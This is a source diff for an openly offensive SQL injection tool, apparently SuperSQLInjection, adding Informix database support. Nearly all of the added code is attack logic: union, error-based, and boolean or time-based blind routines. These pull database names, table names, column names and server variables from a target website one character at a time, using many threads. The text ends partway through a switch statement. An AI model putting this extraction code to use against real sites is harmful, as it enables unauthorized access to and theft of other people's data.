@@ -34,7 +34,7 @@ namespace SuperSQLInjection
         }
         public ShowResponse sr = null;
         public Config config = new Config();//注入基础配置
-
+        public const Char DBVers_Splite_Str = '：';
         public String curren_db = "";//当前数据库
         public String curren_table = "";//当前表
         public static int status = 0;
@@ -113,10 +113,17 @@ namespace SuperSQLInjection
                 t.Start();
             }
         }
+        private void addDBSToItems() {
+
+            string[] dbnames = Enum.GetNames(typeof(DBType));
+            this.cbox_basic_dbType.Items.AddRange(dbnames);
+        }
 
         private void Main_Shown(object sender, EventArgs e)
         {
             HTTP.initMain(this);
+            //添加支持注入的数据库列表
+            addDBSToItems();
             //清空日志
             Thread t = new Thread(Tools.delHTTPLog);
             t.Start();
@@ -303,7 +310,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20190120;
+        public static int version = 20190303;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -574,6 +581,47 @@ namespace SuperSQLInjection
             return "";
         }
 
+        /// <summary>
+        /// 获得union获得error注入的获得的数据内容
+        /// </summary>
+        /// <param name="opayload"></param>
+        /// <returns></returns>
+        public String getOneDataByUnionOrErrorByInformix(String opayload)
+        {
+            return getOneDataByUnionOrError(opayload, Informix.start + Informix.start, Informix.end + Informix.end);
+        }
+
+        /// <summary>
+        /// 获得union获得error注入的获得的数据内容
+        /// </summary>
+        /// <param name="opayload"></param>
+        /// <returns></returns>
+        public String getOneDataByUnionOrError(String opayload,String start,String end)
+        {
+
+            try
+            {
+                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+
+                if (server.body != null && server.body.Length > 0)
+                {
+                    //查找格式^^!col$$$col!^^
+                    Match m = Regex.Match(server.body, "(?<=("+start+"))[.\\s\\S]*?(?=("+ end + "))");
+                    if (m.Success)
+                    {
+                        return m.Value;
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "发生异常：" + e.Message, LogLevel.error);
+
+            }
+            return "";
+        }
+
 
 
         /// <summary>
@@ -641,7 +689,7 @@ namespace SuperSQLInjection
 
                 Thread.CurrentThread.Abort();
             }
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String columns = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, column_list, null, null, -1);
@@ -654,7 +702,7 @@ namespace SuperSQLInjection
         public void getVariablesByUnionBySQLServer(Object v)
         {
 
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             String pay_load = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, sv[1]);
             String result = getOneDataByUnionOrError(pay_load);
             this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
@@ -664,7 +712,7 @@ namespace SuperSQLInjection
         public void getVariablesByUnionByPostgreSQL(Object v)
         {
 
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String pay_load = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, sv[1], "", "", "");
@@ -676,7 +724,7 @@ namespace SuperSQLInjection
         public void getVariablesByUnionByOracle(Object v)
         {
 
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             String pay_load = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, sv[1], "", "", "");
             String result = getOneDataByUnionOrError(pay_load);
             this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
@@ -684,16 +732,25 @@ namespace SuperSQLInjection
         }
         public void getVariablesByUnionByDB2(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             String pay_load = DB2.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "");
             String result = getOneDataByUnionOrError(pay_load);
             this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
             Interlocked.Increment(ref this.currentDataCount);
         }
 
+        public void getVariablesByUnionByInformix(Object v)
+        {
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
+            String pay_load = Informix.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "",Informix.cast_value);
+            String result = getOneDataByUnionOrErrorByInformix(pay_load);
+            this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
         public void getVariablesByUnionBySQLite(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             String pay_load = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, sv[1]);
             String result = getOneDataByUnionOrError(pay_load);
             this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), sv[0], result);
@@ -702,7 +759,7 @@ namespace SuperSQLInjection
 
         public void getVariablesByErrorByMySQL(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String columns = MySQL.creatMySQLColumnsStrByError(column_list, null, null, -1);
@@ -715,7 +772,7 @@ namespace SuperSQLInjection
 
         public void getVariablesByErrorByPostgreSQL(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String pay_load = PostgreSQL.error_value.Replace("{data}", sv[1]);
@@ -727,7 +784,7 @@ namespace SuperSQLInjection
 
         public void getVariablesByErrorBySQLServer(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String pay_load = SQLServer.error_value.Replace("{data}", sv[1]);
@@ -740,7 +797,7 @@ namespace SuperSQLInjection
 
         public void getVariablesByErrorByOracle(Object v)
         {
-            String[] sv = v.ToString().Split(':');
+            String[] sv = v.ToString().Split(DBVers_Splite_Str);
             List<String> column_list = new List<String>();
             column_list.Add(sv[1]);
             String pay_load = Oracle.getErrorDataValue(sv[1], "", "", "");
@@ -773,7 +830,7 @@ namespace SuperSQLInjection
             {
                 for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                 {
-                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                     switch (dbType)
                     {
                         case DBType.Access:
@@ -797,6 +854,9 @@ namespace SuperSQLInjection
                         case DBType.SQLite:
                             stp.QueueWorkItem<String>(getVariablesByUnionBySQLite, v);
                             break;
+                        case DBType.Informix:
+                            stp.QueueWorkItem<String>(getVariablesByUnionByInformix, v);
+                            break;
                     }
                 }
                 stp.WaitForIdle();
@@ -817,7 +877,7 @@ namespace SuperSQLInjection
             {
                 for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                 {
-                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                     switch (dbType)
                     {
                         case DBType.Access:
@@ -838,6 +898,7 @@ namespace SuperSQLInjection
                         case DBType.DB2:
                             MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                             break;
+
                     }
                 }
                 stp.WaitForIdle();
@@ -857,7 +918,7 @@ namespace SuperSQLInjection
             {
                 for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
                 {
-                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + DBVers_Splite_Str + this.data_lvw_ver.CheckedItems[j].Tag;
                     switch (dbType)
                     {
                         case DBType.Access:
@@ -905,6 +966,16 @@ namespace SuperSQLInjection
                         case DBType.SQLite:
                             //获取对应环境变量值
                             stp.QueueWorkItem<String>(getVariableByBoolBySQLite, v);
+                            break;
+                        case DBType.Informix:
+                            if (config.keyType.Equals(KeyType.Time))
+                            {
+                                stp.QueueWorkItem<String>(getVariableByBoolByInformixSleep, v);
+                            }
+                            else {
+                                stp.QueueWorkItem<String>(getVariableByBoolByInformix, v);
+                            }
+                           
                             break;
                     }
                 }
@@ -994,7 +1065,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 String payload_len = MySQL.ver_length.Replace("{data}", vs[1]);
                 int len = getValueByStepUp(payload_len, 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1024,7 +1095,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
 
                 String payload_len = MySQL.getBoolDataBySleep(MySQL.bool_length, config.maxTime).Replace("{data}", vs[1]);
 
@@ -1057,13 +1128,46 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
 
                 String payload_len = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length, config.maxTime).Replace("{data}", vs[1]);
 
                 int len = getValueByStepUp(payload_len, 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                 String va_payload = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value, config.maxTime).Replace("{data}", vs[1]);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 32, 126);
+                    value += ((char)ascii).ToString();
+                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                }
+                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
+
+
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+
+        }
+
+        public void getVariableByBoolByInformixSleep(Object vers)
+        {
+            try
+            {
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
+
+                String payload_len = Informix.getBoolDataBySleep(Informix.bool_length).Replace("{data}", vs[1]);
+
+                int len = getValueByStepUp(payload_len, 0, 10);
+                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+                String va_payload = Informix.getBoolDataBySleep(Informix.bool_value).Replace("{data}", vs[1]);
                 String value = "";
                 //获取值
                 for (int i = 1; i <= len; i++)
@@ -1094,7 +1198,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 String payload_len = PostgreSQL.ver_length.Replace("{data}", vs[1]);
                 int len = getValueByStepUp(payload_len, 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1128,7 +1232,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 //判断变量长度
                 String payload_len = SQLServer.getBoolDataBySleep(SQLServer.bool_length, config.maxTime).Replace("{data}", vs[1]);
                 int len = getValueByStepUp(payload_len, 0, 10);
@@ -1165,7 +1269,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 //判断变量长度
                 int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", vs[1]), 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1205,7 +1309,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 //判断变量长度
                 int len = getValueByStepUp(Oracle.bool_length.Replace("{data}", vs[1]), 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1240,7 +1344,7 @@ namespace SuperSQLInjection
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 //判断变量长度
                 int len = getValueByStepUp(DB2.bool_length.Replace("{data}", vs[1]), 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1271,11 +1375,45 @@ namespace SuperSQLInjection
         /// 获取环境变量DB2 bool
         /// </summary>
         /// <param name="vers"></param>
+        public void getVariableByBoolByInformix(Object vers)
+        {
+            try
+            {
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
+                //判断变量长度
+                int len = getValueByStepUp(Informix.bool_length.Replace("{data}", vs[1]), 0, 10);
+                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+
+                String va_payload = Informix.bool_value.Replace("{data}", vs[1]);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    String dp = va_payload.Replace("{index}", i.ToString());
+                    int ascii = getValue(dp, 32, 126);
+                    value += (char)ascii;
+                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                }
+                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取环境变量sqlite bool
+        /// </summary>
+        /// <param name="vers"></param>
         public void getVariableByBoolBySQLite(Object vers)
         {
             try
             {
-                String[] vs = vers.ToString().Split(':');
+                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                 //判断变量长度
                 int len = getValueByStepUp(SQLite.bool_length.Replace("{data}", vs[1]), 0, 10);
                 this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
@@ -1310,9 +1448,20 @@ namespace SuperSQLInjection
         }
 
         delegate void addItemToListViewByColumnsDelegate(String colvs);
+
         public void addItemToListViewByColumns(String colvs)
         {
-            String[] colv = Regex.Split(colvs, "\\$\\$\\$");
+            addItemToListViewByColumns(colvs, "\\$\\$\\$");
+        }
+
+        public void addItemToListViewByColumnsInformix(String colvs)
+        {
+            addItemToListViewByColumns(colvs, Informix.mid);
+        }
+
+        public void addItemToListViewByColumns(String colvs,String splitReg)
+        {
+            String[] colv = Regex.Split(colvs, splitReg);
             ListViewItem lvi = null;
             for (int i = 0; i < colv.Length; i++)
             {
@@ -1647,6 +1796,54 @@ namespace SuperSQLInjection
             Interlocked.Increment(ref this.currentDbsCount);
         }
 
+        /// <summary>
+        /// 获取数据库名称
+        /// </summary>
+        /// <param name="oindex">下标limit</param>
+        public void getDBNameByBoolByInformix(Object oindex)
+        {
+            try
+            {
+                int db_index = int.Parse(oindex.ToString());
+                //判断对应下标的数据库长度
+                String payload_len = Informix.bool_length.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString()));
+                //判断当前数据库对应的ascii码
+                String va_payload = Informix.bool_value.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString()));
+
+                if (config.keyType.Equals(KeyType.Time))
+                {
+                    payload_len = Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString())));
+                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString())));
+                }
+
+                //判断当前数据库长度限制1-50
+                int len = getValue(payload_len, 1, 50);
+                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index+1) + "长度为：" + len, LogLevel.info);
+
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    if (status != 1)
+                    {
+                        break;
+                    }
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 32, 126);
+                    value += ((char)ascii).ToString();
+                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index, value);
+                }
+                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "的名称为：" + value, LogLevel.info);
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDbsCount);
+        }
+
 
         /// <summary>
         /// 获取数据库名称Union方式MySQL
@@ -1657,11 +1854,12 @@ namespace SuperSQLInjection
             try
             {
                 //获取数据库数量
+                int index = int.Parse(oindex.ToString());
                 List<String> data_list = new List<String>();
                 data_list.Add(MySQL.db_value.Replace("{index}", oindex.ToString()));
                 String db_Name_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                 String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", db_Name_data));
-                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
+                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (index+1) + "的名称为：" + result, LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
             }
             catch (Exception e)
@@ -1723,8 +1921,31 @@ namespace SuperSQLInjection
             try
             {
                 //获取数据库数量
+              
                 String result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, DB2.db_value, "", "", oindex.ToString()));
                 this.txt_log.Invoke(new showLogDelegate(log), "数据库表模式" + oindex + "的名称为：" + result, LogLevel.info);
+                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDbsCount);
+        }
+
+        /// <summary>
+        /// 获取数据库名称Union方式DB2
+        /// </summary>
+        /// <param name="oindex">下标limit</param>
+        public void getDBNameByUnionByInformix(Object oindex)
+        {
+            try
+            {
+                //获取数据库数量
+                int index = int.Parse(oindex.ToString());
+                String result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, Informix.db_value, "", "", oindex.ToString(), Informix.cast_value));
+                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (index + 1) + "的名称为：" + result, LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
             }
             catch (Exception e)
@@ -2030,6 +2251,53 @@ namespace SuperSQLInjection
         }
 
         /// <summary>
+        /// bool方式获取Informix表
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByBoolByInformix(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                int selectIndex = sn.tn.Index;
+                //判断当前表长度
+                String data_payload = Informix.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");
+
+                //判断当前数据库对应的ascii码
+                String va_payload = Informix.bool_value.Replace("{data}", data_payload);
+
+                int len = 0;
+                if (config.keyType.Equals(KeyType.Time))
+                {
+                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value).Replace("{data}", data_payload);
+                    len = getValue(Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload)), 1, 50);
+                }
+                else {
+                    len = getValue(Informix.bool_length.Replace("{data}", data_payload), 1, 50);
+                }
+
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
+                }
+                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
+        /// <summary>
         /// bool方式获取表
         /// </summary>
         /// <param name="osn"></param>
@@ -2247,6 +2515,22 @@ namespace SuperSQLInjection
             String result = getOneDataByUnionOrError(tables_value_payload);
 
             this.txt_log.Invoke(new showLogDelegate(log), "数据库表模式" + sn.dbname + "发现表：" + result, LogLevel.info);
+            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
+        /// <summary>
+        /// 获取表名，多线程调用Informix
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByUnionByInformix(Object osn)
+        {
+
+            SelectNode sn = (SelectNode)osn;
+            String tables_value_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.table_value, sn.dbname, "", sn.limit.ToString(), Informix.cast_value);
+            String result = getOneDataByUnionOrErrorByInformix(tables_value_payload);
+
+            this.txt_log.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + result, LogLevel.info);
             this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
             Interlocked.Increment(ref this.currentTableCount);
         }
@@ -2881,6 +3165,28 @@ namespace SuperSQLInjection
                         MessageBox.Show("没有发现数据库，奇怪了！");
                     }
                     break;
+
+                case DBType.Informix:
+                    //获取数据库数量
+                    result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, Informix.dbs_count, "", "", "", Informix.no_cast_value));
+
+                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
+                    db_len = Tools.convertToInt(result);
+                    this.dbsCount = db_len;
+                    if (db_len > 0)
+                    {
+                        for (int j = 0; j < db_len; j++)
+                        {
+                            //获取对应的数据库
+                            stp.QueueWorkItem<object>(getDBNameByUnionByInformix, j);
+                        }
+                        stp.WaitForIdle();
+                    }
+                    else
+                    {
+                        MessageBox.Show("没有发现数据库，奇怪了！");
+                    }
+                    break;
             }
 
         }
@@ -3022,6 +3328,36 @@ namespace SuperSQLInjection
                             //获取对应的数据库
                             this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                             stp.QueueWorkItem<object>(getDBNameByBoolByDB2, j);
+                        }
+                        stp.WaitForIdle();
+
+                    }
+                    else
+                    {
+                        MessageBox.Show("没有发现数据库，奇怪了！");
+                    }
+                    break;
+                case DBType.Informix:
+                    //获取数据库数量
+                    if (KeyType.Time.Equals(config.keyType))
+                    {
+                        db_len = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_db_count), 0, 10);
+                    }
+                    else
+                    {
+                        db_len = getValueByStepUp(Informix.bool_db_count, 0, 10);
+                    }
+                    
+                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
+                    this.dbsCount = db_len;
+                    if (db_len > 0)
+                    {
+                        //db下标从1开始
+                        for (int j = 0; j < db_len; j++)
+                        {
+                            //获取对应的数据库
+                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
+                            stp.QueueWorkItem<object>(getDBNameByBoolByInformix, j);
                         }
                         stp.WaitForIdle();
 
@@ -3251,6 +3587,30 @@ namespace SuperSQLInjection
                     stp.WaitForIdle();
                     break;
 
+                case DBType.Informix:
+                    //获取当前数据库长度
+                    if (config.keyType.Equals(KeyType.Time))
+                    {
+                        this.tableCount = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_tables_count.Replace("{dbname}", dbname)), 0, 50);
+                    }
+                    else
+                    {
+                        this.tableCount = getValueByStepUp(Informix.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
+                    }
+                    
+                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
+                    for (int i = 0; i < this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        sn.dbname = dbname;
+                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByInformix, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
+
             }
 
 
@@ -3379,6 +3739,24 @@ namespace SuperSQLInjection
                         sn.limit = i;
                         sn.dbname = dbName;
                         stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionBySQLite, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
+                case DBType.Informix:
+                    //获取当前数据库表数量
+                    tables_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.tables_count, dbName, "", "", Informix.no_cast_value);
+                    result = getOneDataByUnionOrErrorByInformix(tables_count_payload);
+
+                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
+                    this.tableCount = Tools.convertToInt(result);
+                    //下标1开始
+                    for (int i = 0; i < this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        sn.dbname = dbName;
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByInformix, sn);
                     }
                     stp.WaitForIdle();
                     break;
@@ -3869,6 +4247,52 @@ namespace SuperSQLInjection
         /// 获取列明称,bool方式
         /// </summary>
         /// <param name="osn">表的节点</param>
+        public void getColumnNameByBoolByInformix(Object osn)
+        {
+
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                //判断当前表长度
+                String data_payload = Informix.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
+                //判断当前数据库对应的ascii码
+                String va_payload = Informix.bool_value.Replace("{data}", data_payload);
+
+                int len = 0;
+                if (KeyType.Time.Equals(config.keyType))
+                {
+                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value.Replace("{data}", data_payload));
+                    len = getValue(Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload)), 1, 50);
+                }
+                else
+                {
+                    len = getValue(Informix.bool_length.Replace("{data}", data_payload), 1, 50);
+                }
+
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
+                }
+                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取列明称,bool方式
+        /// </summary>
+        /// <param name="osn">表的节点</param>
         public void getColumnNameByBoolBySQLite(Object osn)
         {
 
@@ -4013,6 +4437,28 @@ namespace SuperSQLInjection
 
                 String column_Name_data = DB2.getUnionDataValue(config.unionFillTemplate, DB2.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                 String result = getOneDataByUnionOrError(column_Name_data);
+                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
+                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
+            }
+        }
+
+        /// <summary>
+        /// 获取列名，union DB2
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getColumnNameByUnionByInformix(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+
+                String column_Name_data = Informix.getUnionDataValue(config.unionFillTemplate, Informix.column_value, sn.dbname, sn.tableName, sn.limit.ToString(), Informix.cast_value);
+                String result = getOneDataByUnionOrErrorByInformix(column_Name_data);
                 this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
             }
@@ -4255,6 +4701,29 @@ namespace SuperSQLInjection
                                 stp.QueueWorkItem<SelectNode>(getColumnNameByBoolBySQLite, csn);
                                 stp.WaitForIdle();
                                 break;
+                            case DBType.Informix:
+                                if (KeyType.Time.Equals(config.keyType))
+                                {
